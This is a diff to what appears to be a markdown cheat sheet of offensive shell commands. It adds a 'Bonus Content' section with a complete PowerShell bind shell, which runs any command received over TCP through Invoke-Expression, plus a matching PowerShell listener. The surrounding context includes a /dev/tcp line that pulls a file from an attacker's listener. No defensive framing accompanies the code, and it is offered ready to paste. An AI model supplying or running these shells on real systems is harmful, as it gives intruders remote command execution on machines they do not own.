@@ -418,6 +418,24 @@ cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/fil
 
 ***
 
+***
+
+<details>
+
+<summary>Bonus Content</summary>
+
+#### Bonus Content
+
+##### PowerShell Bind Shell:
+
 ```
-& {$LPort = 1337; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTCPClient(); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = [System.IO.StreamWriter]::new($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = [System.Byte[]]::new(1024); while (($RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -ne 0) {$Code = [Text.Encoding]::ASCII.GetString($Buffer, 0, $RawData); try {$Output = Invoke-Expression $Code 2>&1 | Out-String;} catch {$Output = $_.Exception.Message}; $Prompt = "PS $($PWD.Path)> "; $FullOutput = $Output + "`n" + $Prompt; $StreamWriter.Write($FullOutput); $Code = $null}; $TCPClient.Close(); $NetworkStream.Close(); $StreamWriter.Close(); $Listener.Stop()}
+& {$LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); $TCPClient = $Listener.AcceptTCPClient(); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = [System.IO.StreamWriter]::new($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = [System.Byte[]]::new(1024); while (($RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -ne 0) {$Code = [Text.Encoding]::ASCII.GetString($Buffer, 0, $RawData); try {$Output = Invoke-Expression $Code 2>&1 | Out-String;} catch {$Output = $_.Exception.Message}; $Prompt = "PS $($PWD.Path)> "; $FullOutput = $Output + "`n" + $Prompt; $StreamWriter.Write($FullOutput); $Code = $null}; $TCPClient.Close(); $NetworkStream.Close(); $StreamWriter.Close(); $Listener.Stop()}
 ```
+
+##### PowerShell Listener:
+
+```
+& {$LPort = 1337; $Listener = [System.Net.Sockets.TcpListener]::Create($LPort); $Listener.Start(); Write-Output "Listening on port $LPort..."; $TCPClient = $Listener.AcceptTCPClient(); Write-Output "Client connected."; $NetworkStream = $TCPClient.GetStream(); $StreamWriter = [System.IO.StreamWriter]::new($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = [System.Byte[]]::new(1024); while ($TCPClient.Connected) { try { $Input = Read-Host; $StreamWriter.Write($Input + "`n"); $Count = 0; if ($Input -eq "exit") { break } do { $NetworkStream.ReadTimeout = 50; $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($Data -eq 0) { break }; $Data = [Text.Encoding]::ASCII.GetString($Buffer, 0, $RawData); $Output = $Output + $Data } while ($NetworkStream.DataAvailable); Write-Output $Output; $Output = $null; $Data = $null } catch { continue } } $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop(); Write-Output "Connection closed."}
+```
+
+</details>
